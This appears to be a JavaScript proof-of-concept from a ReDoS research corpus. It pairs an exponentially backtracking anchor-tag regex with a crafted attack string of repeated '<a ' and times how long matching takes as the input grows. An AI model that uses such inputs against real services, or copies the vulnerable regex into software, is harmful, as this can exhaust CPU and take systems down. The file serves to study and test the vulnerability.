/* 5542
 * <a[\s]+[^>]*?.*?>([^<]+|.*?)?<\/a>
 * EXPONENT
 * nums:3
 * EXPONENT AttackString:""+"<a "*512+"@1 _SLQ_2"
 */
var REGEX = new RegExp("<a[\s]+[^>]*?.*?>([^<]+|.*?)?<\/a>")
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = '' + '<a '.repeat(i*1) + '@1 _SLQ_2'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 1 + ": " + time_cost+" ms")
}